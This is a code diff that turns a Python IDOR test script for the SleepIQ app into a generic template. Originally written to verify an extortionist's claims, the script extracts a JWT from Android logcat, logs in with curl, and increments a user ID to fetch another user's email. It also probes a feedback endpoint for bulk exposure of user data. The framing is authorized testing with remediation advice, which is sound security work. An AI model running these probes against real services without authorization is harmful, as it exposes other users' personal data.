@@ -1,10 +1,28 @@
 #!/usr/bin/env python3
 """
-IDOR Vulnerability Test for SleepIQ
-Uses Android Test Harness to extract JWT and test for IDOR vulnerabilities
+IDOR Vulnerability Test Template
 
-Authorization: Dennis Hansen, SVP Deputy General Counsel
-Date: January 3, 2026
+This is an EXAMPLE showing how to test for IDOR vulnerabilities.
+Copy and adapt this template for your specific target app and API.
+
+Usage:
+    1. Copy this file to test_<your_app>_idor.py
+    2. Update API endpoints for your target
+    3. Update authentication flow
+    4. Run: python3 test_<your_app>_idor.py
+
+Required environment variables:
+    TEST_EMAIL: Test account email
+    TEST_PASSWORD: Test account password
+    TARGET_ID: Your user/resource ID (to test accessing others' data)
+    API_BASE: Target API base URL
+
+Example:
+    export TEST_EMAIL=test@example.com
+    export TEST_PASSWORD=secret123
+    export TARGET_ID=12345
+    export API_BASE=https://api.example.com/v1
+    python3 example_idor_test.py
 """
 
 import subprocess
@@ -86,16 +104,19 @@ def run_cmd(command: str) -> str:
 
 
 def extract_jwt_from_logcat() -> str:
-    """Extract JWT token from logcat"""
+    """Extract JWT token from logcat
+
+    CUSTOMIZE: Adjust the JWT extraction pattern if your app uses a different format.
+    """
     print("[1/5] Extracting JWT token from logcat...")
-    print("    (Make sure SleepIQ app is running and you're logged in)")
+    print("    (Make sure target app is running and you're logged in)")
     print("")
 
     # Clear logcat
     subprocess.run("adb logcat -c", shell=True)
 
     print("⏳ Monitoring logs for 15 seconds...")
-    print("   (Navigate in the SleepIQ app on your device)")
+    print("   (Navigate in the app on your device)")
     print("")
 
     # Monitor logcat for JWT (starts with eyJ)
@@ -133,19 +154,31 @@ def extract_jwt_from_logcat() -> str:
         print("⚠️  No JWT token found in logs")
         print("")
         print("Try these alternatives:")
-        print("1. Use Android Studio Profiler (see START_NOW.md)")
+        print("1. Use Android Studio Profiler to capture network traffic")
         print("2. Re-run this script while navigating in the app")
         return None
 
 
 def authenticate() -> dict:
-    """Authenticate and get session cookie"""
+    """Authenticate and get session cookie
+
+    CUSTOMIZE: Update this function for your target API's auth flow.
+    - Change endpoint path
+    - Update request headers
+    - Update request body format
+    - Update session cookie extraction
+    """
     print("\n[2/5] Authenticating to get session cookie...")
 
+    # Validate auth config
+    config.require_auth()
+
     cookies_path = get_cookies_path()
+
+    # CUSTOMIZE: Your API login endpoint and request format
     cmd = f"""curl -s -X PUT "{config.api_base}/login" \\
         -H "Content-Type: application/json" \\
-        -H "X-App-Version: 5.3.30" \\
+        -H "X-App-Version: 1.0.0" \\
         -d '{{"login":"{config.test_email}","password":"{config.test_password}"}}' \\
         -c {cookies_path}"""
 
@@ -155,7 +188,7 @@ def authenticate() -> dict:
         data = json.loads(response)
         print(f"✓ Authenticated: {json.dumps(data, indent=2)[:100]}...")
 
-        # Extract JSESSIONID
+        # CUSTOMIZE: Extract your session cookie/token
         jsessionid = run_cmd(f"grep JSESSIONID {cookies_path} | awk '{{print $7}}'")
         return {
             "jsessionid": jsessionid,
@@ -167,20 +200,29 @@ def authenticate() -> dict:
 
 
 def test_idor(jsessionid: str, jwt_token: str) -> bool:
-    """Test IDOR vulnerability"""
-    print("\n[3/5] Testing IDOR on Sleeper Endpoint...")
+    """Test IDOR vulnerability
+
+    CUSTOMIZE: Update this function for your target API's vulnerable endpoint.
+    - Change the endpoint path
+    - Update the ID parameter format
+    - Update headers as needed
+    - Adjust response parsing for your API's format
+    """
+    print("\n[3/5] Testing IDOR on Target Endpoint...")
     print("=" * 60)
 
-    test_id = int(config.sleeper_id) + 1
-    print(f"Your Sleeper ID:  {config.sleeper_id}")
-    print(f"Testing ID:       {test_id}")
+    # CUSTOMIZE: How to generate test ID (e.g., increment, UUID, etc.)
+    test_id = int(config.target_id) + 1
+    print(f"Your ID:     {config.target_id}")
+    print(f"Testing ID:  {test_id}")
     print(f"(Attempting to access another user's data)")
     print("")
 
-    cmd = f"""curl -s "{config.api_base}/sleeper/{test_id}" \\
+    # CUSTOMIZE: Your vulnerable endpoint and request format
+    cmd = f"""curl -s "{config.api_base}/resource/{test_id}" \\
         -H "Cookie: JSESSIONID={jsessionid}" \\
         -H "Authorization: {jwt_token}" \\
-        -H "X-App-Version: 5.3.30" \\
+        -H "X-App-Version: 1.0.0" \\
         -H "X-App-Platform: android" \\
         -H "User-Agent: okhttp/4.12.0" \\
         -w "\\nHTTP_STATUS:%{{http_code}}\""""
@@ -208,10 +250,10 @@ def test_idor(jsessionid: str, jwt_token: str) -> bool:
         try:
             data = json.loads(response_body)
 
-            # Extract email
+            # CUSTOMIZE: Extract identifying field from response
             found_email = None
-            if "sleepers" in data and len(data["sleepers"]) > 0:
-                found_email = data["sleepers"][0].get("email", "")
+            if "users" in data and len(data["users"]) > 0:
+                found_email = data["users"][0].get("email", "")
             elif "email" in data:
                 found_email = data["email"]
 
@@ -220,12 +262,11 @@ def test_idor(jsessionid: str, jwt_token: str) -> bool:
                 print(f"Your email:              {config.test_email}")
                 print("")
 
-                # THE CRITICAL CHECK: Is it a DIFFERENT email?
+                # THE CRITICAL CHECK: Is it a DIFFERENT user's data?
                 if found_email != config.test_email:
                     print("🚨🚨🚨 CRITICAL VULNERABILITY CONFIRMED! 🚨🚨🚨")
                     print("🚨 Successfully accessed ANOTHER USER's data!")
                     print(f"🚨 Their email: {found_email}")
-                    print("🚨 Threat actor's claims are VALIDATED!")
                     print("")
                     return True
                 else:
@@ -254,15 +295,19 @@ def test_idor(jsessionid: str, jwt_token: str) -> bool:
         return False
 
 
-def test_feedback_api(jsessionid: str, jwt_token: str) -> bool:
-    """Test Feedback API exposure"""
-    print("\n[4/5] Testing Feedback API Exposure...")
+def test_data_exposure(jsessionid: str, jwt_token: str) -> bool:
+    """Test for bulk data exposure
+
+    CUSTOMIZE: Update this for endpoints that might leak multiple users' data.
+    """
+    print("\n[4/5] Testing Data Exposure Endpoint...")
     print("=" * 60)
 
+    # CUSTOMIZE: Your potentially vulnerable endpoint
     cmd = f"""curl -s "{config.api_base}/feedback" \\
         -H "Cookie: JSESSIONID={jsessionid}" \\
         -H "Authorization: {jwt_token}" \\
-        -H "X-App-Version: 5.3.30" \\
+        -H "X-App-Version: 1.0.0" \\
         -w "\\nHTTP_STATUS:%{{http_code}}\""""
 
     response = run_cmd(cmd)
@@ -282,15 +327,15 @@ def test_feedback_api(jsessionid: str, jwt_token: str) -> bool:
     print(f"HTTP Status: {http_status}")
 
     if http_status == "200":
-        # Count how many emails are in the response
+        # Count how many unique identifiers are in the response
         email_count = response_body.count('"email"')
 
         if email_count > 1:
-            print(f"🚨 CRITICAL: Feedback API returns {email_count} users' data!")
+            print(f"🚨 CRITICAL: Endpoint returns {email_count} users' data!")
             print(f"Response preview: {response_body[:200]}...")
             return True
         elif email_count == 1:
-            print(f"✓ Returns only your own feedback")
+            print(f"✓ Returns only your own data")
             return False
         else:
             print(f"✓ No email in response")
@@ -302,9 +347,8 @@ def test_feedback_api(jsessionid: str, jwt_token: str) -> bool:
 
 def main():
     print("=" * 60)
-    print("SLEEPIQ IDOR VULNERABILITY TEST")
+    print("IDOR VULNERABILITY TEST")
     print("=" * 60)
-    print(f"Authorization: Dennis Hansen, SVP Deputy General Counsel")
     print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
     print("=" * 60)
     print("")
@@ -340,7 +384,7 @@ def main():
         else:
             print("\n❌ No JWT token available")
             print("   Please capture JWT token first:")
-            print("   1. See START_NOW.md for Android Studio method")
+            print("   1. Use Android Studio Profiler")
             print("   2. Or run this script while navigating in the app")
             return
 
@@ -355,7 +399,7 @@ def main():
 
     # Run tests
     idor_vulnerable = test_idor(jsessionid, jwt_token)
-    feedback_vulnerable = test_feedback_api(jsessionid, jwt_token)
+    data_exposed = test_data_exposure(jsessionid, jwt_token)
 
     # Final verdict
     print("\n" + "=" * 60)
@@ -363,30 +407,23 @@ def main():
     print("=" * 60)
     print("")
 
-    if idor_vulnerable or feedback_vulnerable:
-        print("🚨 BLACKMAIL THREAT IS CREDIBLE")
+    if idor_vulnerable or data_exposed:
+        print("🚨 IDOR VULNERABILITY CONFIRMED")
         print("=" * 60)
         print("")
-        print("CRITICAL vulnerabilities exist that match")
-        print("the threat actor's claims.")
+        print("The application is vulnerable to IDOR attacks.")
         print("")
-        print("LEGAL RECOMMENDATION:")
-        print("  ✓ DO NOT PAY the extortion demand")
-        print("  ✓ Report to FBI immediately")
-        print("  ✓ Treat as confirmed data breach")
-        print("  ✓ Begin GDPR 72-hour notification assessment")
-        print("  ✓ Initiate incident response procedures")
+        print("RECOMMENDATIONS:")
+        print("  ✓ Implement proper authorization checks")
+        print("  ✓ Use indirect object references (UUIDs)")
+        print("  ✓ Verify user owns requested resource")
+        print("  ✓ Log and alert on suspicious access patterns")
     else:
-        print("✓ THREAT APPEARS TO BE A BLUFF")
+        print("✓ NO IDOR VULNERABILITY DETECTED")
         print("=" * 60)
         print("")
-        print("Could not replicate claimed vulnerabilities.")
-        print("")
-        print("LEGAL RECOMMENDATION:")
-        print("  ✓ DO NOT PAY the extortion demand")
-        print("  ✓ Report extortion attempt to FBI")
-        print("  ✓ No breach notification required")
-        print("  ✓ Implement preventive security patches")
+        print("Could not access other users' data.")
+        print("API appears to have proper authorization.")
 
     print("")
     print("=" * 60)
